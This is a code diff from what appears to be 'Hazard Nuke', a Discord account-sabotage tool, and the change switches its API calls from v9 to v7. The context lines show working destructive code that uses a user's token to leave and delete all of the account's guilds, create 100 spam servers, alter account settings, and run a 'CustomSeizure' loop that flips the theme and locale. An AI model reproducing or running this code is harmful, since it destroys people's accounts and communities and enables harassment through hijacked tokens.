@@ -32,11 +32,11 @@ def Hazard_Nuke(token, Server_Name, message_Content):
             print(f"The following error has been encountered and is being ignored: {e}")
     print(f"{Fore.RED}Sent a Message to all available friends.{Fore.RESET}\n")
     
-    guildsIds = requests.get("https://discord.com/api/v9/users/@me/guilds", headers=getheaders(token)).json()
+    guildsIds = requests.get("https://discord.com/api/v7/users/@me/guilds", headers=getheaders(token)).json()
     for guild in guildsIds:
         try:
             requests.delete(
-                f'https://discord.com/api/v9/users/@me/guilds/'+guild['id'],
+                f'https://discord.com/api/v7/users/@me/guilds/'+guild['id'],
                 headers=getheaders(token))
             setTitle(f"Leaving guild: "+guild['name'])
             print(f"{Fore.YELLOW}Left guild: {Fore.WHITE}"+guild['name']+Fore.RESET)
@@ -45,7 +45,7 @@ def Hazard_Nuke(token, Server_Name, message_Content):
             
     for guild in guildsIds:
         try:
-            requests.delete(f'https://discord.com/api/v9/guilds/'+guild['id'], headers=getheaders(token))
+            requests.delete(f'https://discord.com/api/v7/guilds/'+guild['id'], headers=getheaders(token))
             setTitle(f"Deleting guild: "+guild['name'])
             print(f'{Fore.LIGHTRED_EX}Deleted guild: {Fore.WHITE}'+guild['name']+Fore.RESET)
         except Exception as e:
@@ -66,7 +66,7 @@ def Hazard_Nuke(token, Server_Name, message_Content):
     for i in range(100):
         try:
             payload = {'name': f'{Server_Name}', 'region': 'europe', 'icon': None, 'channels': None}
-            requests.post('https://discord.com/api/v9/guilds', headers=getheaders(token), json=payload)
+            requests.post('https://discord.com/api/v7/guilds', headers=getheaders(token), json=payload)
             setTitle(f"Creating {Server_Name} #{i}")
             print(f"{Fore.BLUE}Created {Server_Name} #{i}.{Fore.RESET}")
         except Exception as e:
@@ -88,7 +88,7 @@ def Hazard_Nuke(token, Server_Name, message_Content):
           'explicit_content_filter': '0',
           'status': "idle"
     }
-    requests.patch("https://discord.com/api/v9/users/@me/settings", headers=getheaders(token), json=setting)
+    requests.patch("https://discord.com/api/v7/users/@me/settings", headers=getheaders(token), json=setting)
     j = requests.get("https://discordapp.com/api/v9/users/@me", headers=getheaders(token)).json()
     a = j['username'] + "#" + j['discriminator']
     setTitle(f"Hazard Nuke Successfully Detonated!")
@@ -104,4 +104,4 @@ def CustomSeizure(token):
         modes = cycle(["light", "dark"])
         #cycle between light/dark mode and languages
         setting = {'theme': next(modes), 'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN'])}
-        requests.patch("https://discord.com/api/v9/users/@me/settings", headers=getheaders(token), json=setting)
+        requests.patch("https://discord.com/api/v7/users/@me/settings", headers=getheaders(token), json=setting)
